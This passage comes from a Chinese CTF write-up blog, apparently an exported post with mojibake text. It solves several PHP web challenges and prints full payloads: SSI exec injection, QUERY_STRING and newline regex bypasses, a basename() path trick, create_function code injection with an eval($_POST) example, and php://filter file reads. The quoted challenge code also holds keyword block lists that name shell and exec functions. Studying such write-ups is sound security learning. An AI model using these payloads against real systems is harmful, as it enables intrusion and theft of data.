range(3): #è¿™é‡Œçš„range(number)æŒ‡çˆ†ç ´å‡ºå¤šå°‘ç»“æœåœæ­¢ list.append(str(10000000*i) + &#x27;:&#x27; + str(10000000*(i+1)))pool = tp() #ä½¿ç”¨å¤šçº¿ç¨‹åŠ å¿«çˆ†ç ´é€Ÿåº¦pool.map(findCode, list) pool.close()pool.join() å¾—åˆ°password:2020666 ç„¶åä»¥adminï¼Œ2020666ç™»å½•ï¼Œåœ¨headerä¸­å‘ç°éšæœºç”Ÿæˆçš„æ–‡ä»¶æ‰€åœ¨è·¯å¾„ã€‚è®¿é—®ä¹‹ï¼Œå‘ç°ç•Œé¢ä¸ºï¼š çœ‹åˆ°è¿™ä¸ªadminçŒœæµ‹è‚¯å®šæœ‰æ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯ç”¨&#123;&#123;7*'7'&#125;&#125;éªŒè¯ä¸€ç›´è¿”å›failï¼ŒæŸ¥é˜…wpå¾—çŸ¥æ˜¯SSIæ³¨å…¥ï¼ˆæˆ‘ä¹‹å‰éƒ½æ²¡å¬è¿‡ï¼‰ã€‚ å¯ä»¥é€šè¿‡publicæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶åç¼€å.shtmlå¾—åˆ°çº¿ç´¢ å‚è€ƒæ–‡ç«  åœ¨usernameè®¾ç½®&lt;!--#exec cmd=&quot;å‘½ä»¤&quot;--&gt; ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚ æ‹“å±• å¦ä¸€ç§å½¢å¼çš„MD5æˆªæ–­éªŒè¯ï¼š https://www.cnblogs.com/yesec/p/11300841.html MRCTF2020 å¥—å¨ƒ è€ƒç‚¹ $_SERVER['QUERY_STRING']ç»•è¿‡ ä»£ç å®¡è®¡ è§£é¢˜ ç¬¬ä¸€å±‚ 123456789//1st$query = $_SERVER[&#x27;QUERY_STRING&#x27;]; if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123; die(&#x27;Y0u are So cutE!&#x27;);&#125; if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123; echo &quot;you are going to the next ~&quot;;&#125; é¢˜å¤–è¯ï¼š$_SERVER['QUERY_STRING']ä¸ä¼šè¿›è¡ŒURLDecodeï¼Œè€Œ$_GET[]ä¼šå°†å‚æ•°è¿›è¡ŒURLDecode åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypassç¬¬ä¸€ä¸ªifè¯­å¥ã€‚ å‚è€ƒæ–‡ç« ï¼šhttps://www.freebuf.com/articles/web/213359.html ç¬¬äºŒä¸ªifä¸­æ­£åˆ™åŒ¹é…è¡¨ç¤ºåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´å’Œç»“å°¾ï¼Œç”±äºåœ¨å­—ç¬¦ä¸²ä¸­æ¢è¡Œå¯ä»¥è¡¨ç¤ºå­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œæ‰€ä»¥å¯ä»¥ç”¨%0aç»•è¿‡ã€‚ å‚è€ƒæ–‡ç« ï¼šhttps://www.cnblogs.com/20175211lyz/p/12198258.html æ‰€ä»¥ç¬¬ä¸€å±‚çš„payloadå°±æ˜¯ 1?b%20u%20p%20t&#x3D;23333%0a ç¬¬äºŒå±‚ æŸ¥çœ‹æºä»£ç ï¼Œæœ‰ä¸€å¤§ä¸²çš„JSFuckç¼–ç ï¼Œç›´æ¥æ‹¿åˆ°consoleè·‘ æç¤ºéœ€è¦POSTä¸€ä¸‹Merakæ•°æ®ï¼Œå†…å®¹ä»»æ„ã€‚ç»§ç»­å®¡è®¡ä»£ç  12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); include &#x27;takeip.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); include &#x27;flag.php&#x27;;if(isset($_POST[&#x27;Merak&#x27;]))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#x27;127.0.0.1&#x27;)echo &quot;Sorry,you don&#x27;t have permission! Your ip is :&quot;.$ip;if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;?&gt; åªå…è®¸æœ¬åœ°ç™»å½•ï¼Œé‚£ä¹ˆå°±åŠ ä¸ŠClient-IP:127.0.0.1çš„Headerã€‚æ¥ç€ä½¿ç”¨dataä¼ªåè®®ä»2333å‚æ•°ä¸­è¯»å–todat is a happy dayã€‚ æ¥ä¸‹æ¥å°±æ˜¯é€†å‘changeå‡½æ•°ï¼Œ 1234567891011&lt;?phpfunction unchange($v)&#123; $re = &#x27;&#x27;; for ($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr(ord($v[$i]) - $i*2); &#125; return $re;&#125;$real = unchange(&quot;flag.php&quot;);echo base64_encode($real); æ‰€ä»¥ç¬¬äºŒå±‚çš„payloadå°±æ˜¯ï¼š 1?2333&#x3D;data:text&#x2F;plain,tadat is a happy day&amp;file&#x3D;ZmpdYSZmXGI&#x3D; [Zer0pts2020]Can you guess it? è€ƒç‚¹ $_SEVER['PHP_SELF']åˆ©ç”¨ basename()ç»•è¿‡ è§£é¢˜ åˆ©ç”¨ç‚¹åœ¨: 1234if (isset($_GET[&#39;source&#39;])) &#123; highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); exit();&#125; ä½†æ˜¯å‰é¢è¿˜æœ‰è¿‡æ»¤ï¼š 123if (preg_match(&#39;&#x2F;config\\.php\\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123; exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125; å…¶ä¸­$_SERVER['PHP_SELF']æˆ‘ä»¬çŸ¥é“å®ƒçš„å€¼æ˜¯urlç›¸å¯¹è·¯å¾„ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¾“å…¥/index.php/config.php?source ä¼šè¿”å›/index.php/config.php æˆ‘ä»¬çŸ¥é“preg_match æ˜¯éœ€è¦å®Œå…¨åŒ¹é…æ‰ä¼šè¿”å›trueçš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¾“å…¥/index.php/config.php/aå°±å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯basenameçš„ç»“æœä¼šæ˜¯aæ˜¾ç„¶ä¼šæŠ¥é”™ï¼Œå› ä¸ºæ²¡è¿™ä¸ªæ–‡ä»¶ã€‚æ­¤æ—¶æˆ‘ä»¬æƒ³åˆ°äº†basenameä¼šå¿½ç•¥ä¸€äº›å¥‡æ€ªçš„å­—ç¬¦%80 ~ %ffã€‚ æ‰€ä»¥æˆ‘ä»¬è¾“å…¥/index.php/comfig.php/%ff å°±å¯ä»¥è¿›è¡Œæ˜¾ç¤ºcomfig.phpæ–‡ä»¶ï¼Œè¿™é‡Œæ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯åœ¨index.phpä¸‹è¿›è¡Œçš„ï¼ˆæˆ‘ä»¬çœ‹åˆ°çš„ä»£ç éƒ½æ˜¯index.phpçš„ä»£ç ï¼‰ã€‚å½“ç„¶æˆ‘ä»¬ä¸è¦å¿˜è®°ä¼ getçš„å˜é‡sourceã€‚ payloadï¼š/index.php/config.php/%81?source [BJDCTF2020]EzPHP è€ƒç‚¹ QUERY_STRINGç»•è¿‡ SHA1æ•°ç»„ç»•è¿‡ preg_matchæ•°ç»„ç»•è¿‡ extractå˜é‡è¦†ç›– create_functionæ³¨å…¥ è§£é¢˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET[&#x27;shana&#x27;];$passwd = $_GET[&#x27;passwd&#x27;];$arg = &#x27;&#x27;;$code = &#x27;&#x27;;echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) &#123; if ( preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]) ) die(&#x27;You seem to want to do something bad?&#x27;); &#125;if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123; if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; &#125; &#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value)) die(&#x27;fxck you! I hate English!&#x27;); &#125; &#125; if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;) die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123; die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i&#x27;, $arg) ) &#123; die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); &#125; else &#123; include &quot;flag.php&quot;; $code(&#x27;&#x27;, $arg); &#125; ?&gt; $_SERVER[â€˜QUERY_STRINGâ€™]ç»•è¿‡ éœ€è¦æ˜ç¡®ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š $_SERVER['QUERY_STRING']è¿”å›urlä¸­æŸ¥è¯¢çš„å­—ç¬¦ä¸²ï¼Œä¸æ­¤ç±»ä¼¼çš„è¿˜æœ‰ï¼š $_SERVER['REQUEST_URI']è¿”å›è®¿é—®æ­¤é¡µé¢æ‰€éœ€çš„URI $_SERVER['SCRIPT_NAME']è¿”å›åŒ…å«å½“å‰è„šæœ¬çš„è·¯å¾„ $_SERVER['PHP_SELF']å½“å‰æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å ä¸¾ä¸ªä¾‹å­ï¼š(æµè§ˆå™¨è‡ªåŠ¨å°†fileçš„urlç¼–ç è§£ç äº†) å¯ä»¥çœ‹åˆ°ï¼Œ$_SERVER['QUERY_STRING']å’Œ$_SERVER['REQUEST_URI']åœ¨ä¼ è¾“æ—¶ä¸ä¼šurlè§£ç ï¼Œè€Œ$_GET,$_POSTä¼šurlè§£ç ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥urlç¼–ç ç»•è¿‡ä¸‹é¢ä»£ç ï¼š 123456if($_SERVER) &#123; if ( preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]) ) die(&#x27;You seem to want to do something bad?&#x27;); &#125; preg_matchæ¢è¡Œç¬¦ç»•è¿‡ 123456if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123; if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; &#125; &#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;); ç”±äºæ²¡æœ‰/sä¿®é¥°ç¬¦ç”¨æ¥åœ¨åŒ¹é…æ—¶åŒ¹é…æ¢è¡Œç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨%0aæ¢è¡Œæ±¡æŸ“ç»•è¿‡ã€‚ $_REQUESTå­—æ¯åŒ¹é…ç»•è¿‡ 123456if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value)) die(&#x27;fxck you! I hate English!&#x27;); &#125; &#125; $_REQUESTåŒ…å«_POSTã€_GETå’ŒCOOKIEä¸‰ä¸ªå…¨å±€å˜é‡ï¼Œå¹¶ä¸”POSTå…·æœ‰æ›´é«˜çš„ä¼˜å…ˆå€¼ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥POSTåŒæ ·åç§°æ»¡è¶³æ¡ä»¶çš„å€¼ï¼Œæ¯”å¦‚æ•°å­—å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªåŒ¹é…ã€‚å¦å¤–ï¼Œæ•°ç»„ç±»å‹çš„æ•°æ®ä¸éœ€è¦POSTï¼Œpreg_match()åªèƒ½åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•°ç»„å¾—ä»¥ç»•è¿‡ã€‚ æˆ‘åœ¨BUUOJä¸Šé¢åšè¿™ä¸ªé¢˜çš„æ—¶å€™ï¼Œä¸€ç›´ç»•ä¸è¿‡è¿™ä¸ªå­—æ¯åŒ¹é…ï¼Œå†ä»”ç»†ä¸€çœ‹ï¼Œå‘ç°æ˜¯buuè‡ªå¸¦çš„cookieçš„åŸå› ï¼Œåˆ æ‰å³å¯ã€‚ file_get_contentsæ¯”å¯¹ç»•è¿‡ 12if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;) die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;); åˆšå¼€å§‹æƒ³çš„æ˜¯php://inputï¼Œåæ¥å‘ç°è¦POSTæ•°æ®ï¼Œå› æ­¤ä¾¿ä¸èƒ½ç”¨äº†ï¼Œè¿™é‡Œå¯ä»¥ç”¨data://ï¼Œç¤ºä¾‹ï¼š 12data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D; sha1æ¯”è¾ƒ 123456if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123; die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);&#125; ç›´æ¥æ•°ç»„ç»•è¿‡ã€‚ extractå˜é‡è¦†ç›– å› ä¸ºextract()å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ï¼Œé’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¼ æ•°ç»„ï¼Œå³flag[code]å’Œflag[arg]çš„å½¢å¼ã€‚ create_functionä»£ç æ³¨å…¥ 1234567if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i&#x27;, $arg) ) &#123; die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); &#125; else &#123; include &quot;flag.php&quot;; $code(&#x27;&#x27;, $arg); &#125; åŸºæœ¬çš„æ³¨å…¥å½¢å¼ï¼š 12&lt;?php$myFunc = create_function(&#x27;$a, $b&#x27;, &#x27;return($a+$b);&#125;eval($_POST[1]);\\\\&#x27;); æ‰§è¡Œæ—¶ç›¸å½“äºï¼š 1234function myFunc($a, $b)&#123; return $a+$b;&#125;eval($_POST[1]);//&#125; é‚£ä¹ˆè¿™é“é¢˜ç¦ç”¨äº†å¾ˆå¤šç±»ä¼¼æ— å‚æ•°RCEçš„å‡½æ•°å…³é”®å­—ï¼Œä¹Ÿç¦ç”¨äº†å¾ˆå¤šè¯»æ–‡ä»¶çš„ç³»ç»Ÿå‘½ä»¤ã€‚ ä½†æ˜¯ä»£ç ä¸­å·²ç»åŒ…å«äº†flag.phpï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨é‡Œé¢çš„å˜é‡ã€‚æ‰€ä»¥è¦æƒ³åŠæ³•åœ¨ä¸æŒ‡å®šå˜é‡åç§°çš„æƒ…å†µä¸‹è¾“å‡ºå˜é‡çš„å€¼ï¼Œå¯ä»¥æƒ³åˆ°ï¼šæ˜¯å¦å­˜åœ¨ä¸€ä¸ªå‡½æ•°ï¼Œèƒ½è¾“å‡ºæ‰€æœ‰å˜é‡çš„å€¼ï¼Ÿ ç­”æ¡ˆæ˜¯get_defined_vars()ç”¨æ¥è¾“å‡ºæ‰€æœ‰å˜é‡å’Œå€¼ã€‚ é‚£ä¹ˆæ•´ä½“çš„payloadå°±æ˜¯ 121nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;POST: debu&#x3D;1&amp;file&#x3D;1 è§£ç åå°±æ˜¯ 1231nD3x.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;POST: debu&#x3D;1&amp;file&#x3D;1 æ‰“å°äº†æ‰€æœ‰å˜é‡ æç¤ºæˆ‘ä»¬çœŸçš„flagåœ¨realfl4g.phpé‡Œé¢ï¼Œé‚£ä¹ˆå°±å»åŒ…å«realfl4g.phpæ–‡ä»¶ã€‚ è¿™ä¸ªåœ°æ–¹è¿‡æ»¤äº†includeå’Œå•å¼•å·ï¼Œå¯ä»¥ç”¨require()æ¥ä»£æ›¿ï¼Œè¿‡æ»¤flagå…³é”®å­—ï¼Œå°±ç”¨base64ç¼–ç ç»•è¿‡ã€‚é‚£ä¹ˆpayloadå°±æ˜¯ 1231nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67[%61%72%67]&#x3D;&#125;require(base64_%64%65%63%6f%64%65(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_functionPOST: debu&#x3D;1&amp;file&#x3D;1 è§£ç å 12file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;require(base64_decode(cmVhbGZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F; å–åç»•è¿‡+ä¼ªåè®®è¯»å–æºç  payload 1231nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;POST: debu&#x3D;1&amp;file&#x3D;1 è¯»åˆ°æºç  12345678910111213&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;&gt;&lt;title&gt;Real_Flag In Here!!!&lt;/title&gt;&lt;/head&gt;&lt;/html&gt;&lt;?php echo &quot;å’¦ï¼Œä½ å±…ç„¶æ‰¾åˆ°æˆ‘äº†ï¼Ÿï¼ä¸è¿‡çœ‹åˆ°è¿™å¥è¯ä¹Ÿä¸ä»£è¡¨ä½ å°±èƒ½æ‹¿åˆ°flagå“¦ï¼&quot;; $f4ke_flag = &quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;; $rea1_f1114g = &quot;flag&#123;b1fcb796-18ed-4790-96d4-42becc504efc&#125;&quot;; unset($rea1_f1114g); åŸæ¥æ˜¯æŠŠå˜é‡ç»™é‡Šæ”¾äº†ã€‚ æ‹“å±• ä»‹ç»ä¸€ç§éé¢„æœŸè§£ï¼š æ•°ç»„ç»•è¿‡ åŠ äº†ä¸ªå‚æ•°ï¼Œä¼ ä¸Šå»ä¼ªåè®®ï¼Œç„¶åget_defined_vars()æ•°ç»„è·å–åˆ°è¿™ä¸ªä¼ªåè®®æ”¾åˆ°require()é‡ŒåŒ…å«ï¼Œpayloadï¼š 1?deb%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;%64%61%74%61%3a%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;rce&#x3D;%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%72%65%61%64%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%65%6e%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%72%65%61%31%66%6c%34%67%2e%70%68%70&amp;rce2&#x3D;r&amp;sha%6e%61[]&#x3D;a&amp;pa%73sw%64[]&#x3D;b&amp;fla%67[co%64e]&#x3D;create_function&amp;fla%67[ar%67]&#x3D;;&#125;require(get_defined_vars()[_GET][rce]);%0a&#x2F;&#x2F; è§£ç åï¼š 123?debu&#x3D;aqua_is_cute&amp;file&#x3D;data:,debu_debu_aqua&amp;rce&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php&amp;rce2&#x3D;r&amp;shana[]&#x3D;a&amp;passwd[]&#x3D;b&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;;&#125;require(get_defined_vars()[_GET][rce]);&#x2F;&#x2F; å‚è€ƒ https://www.gem-love.com/ctf/770.html [HarekazeCTF2019]encode_and_encode è€ƒç‚¹ jsonå­—ç¬¦è½¬ä¹‰ ä¼ªåè®®ç»•è¿‡ è§£é¢˜ 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phperror_reporting(0);if (isset($_GET[&#x27;source&#x27;])) &#123; show_source(__FILE__); exit();&#125;function is_valid($str) &#123; $banword = [ // no path traversal &#x27;\\.\\.&#x27;, // no stream wrapper &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;, // no data exfiltration &#x27;flag&#x27; ]; $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$body = file_get_contents(&#x27;php://input&#x27;);$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123; $page = $json[&#x27;page&#x27;]; $content = file_get_contents($page); if (!$content || !is_valid($content)) &#123; $content = &quot;&lt;p&gt;not found&lt;/p&gt;\\n&quot;; &#125;&#125; else &#123; $content = &#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;;&#125;// no data exfiltration!!!$content = preg_replace(&#x27;/HarekazeCTF\\&#123;.+\\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);echo json_encode([&#x27;content&#x27; =&gt; $content]); å¤§æ¦‚å°±æ˜¯ä¼ ä¸€ä¸ªjsonç¼–ç çš„æ•°æ®ï¼Œç„¶åjsonè§£ç ï¼Œè¿›è¡Œis_validé»‘åå•è¿‡æ»¤ï¼Œç„¶åfile_get_contentsï¼Œå†ä¸€æ¬¡è¿›è¡Œé»‘åå•è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯æ—¢å¯¹åŸå§‹æ•°æ®ï¼Œåˆå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œç”±äºjsonä½¿æ”¯æŒunicodeç¼–ç çš„ï¼Œæ‰€ä»¥å¯ä»¥ç”¨unicodeä»£æ›¿å…³é”®å­—ï¼Œå¹¶ç”¨ä¼ªåè®®base64ç¼–ç ï¼Œpayload: 1&#123;&quot;page&quot;:&quot;\\u0070\\u0068\\u0070:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;\\u0066\\u006c\\u0061\\u0067&quot;&#125; å‚è€ƒ https://p1htmlkernalweb.mybluemix.net/articles/[HarekazeCTF2019]encode_and_encode_3837296_csdn.html [CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1 TODO [CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox TODO [HarekazeCTF2019]Easy Notes TODO [RCTF 2019]Nextphp TODO [De1CTF 2019]ShellShellShell TODO","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"ä»£ç å®¡è®¡","slug":"CTF/ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/categories/CTF/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"2020ç”µä¿¡å¤©ç¿¼æ¯CTFåˆèµ›-APITest","date":"2020-07-31T13:58:37.000Z","path":"Web_security/ctf_writeup/17.2020ç”µä¿¡å¤©ç¿¼æ¯CTFâ€”APITest/","text":"2020ç”µä¿¡å¤©ç¿¼æ¯CTF APITest å…ˆåæ§½ä¸€ä¸‹ï¼Œèµ›åç«Ÿç„¶æ²¡æœ‰WPï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ å®Œå…¨ä¸ä¼šnodejsï¼Œåšäº†ä¸€ä¸‹åˆå±…ç„¶åšå‡ºæ¥äº†ã€‚ã€‚ã€‚é¢˜ç›®æ‰“å¼€ï¼Œè®¿é—®sourceAPIæ¥å£ï¼Œæ˜¾ç¤ºæºç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173const express = require(&quot;express&quot;);const cors = require(&quot;cors&quot;);const app = express();const uuidv4 = require(&quot;uuid/v4&quot;);const 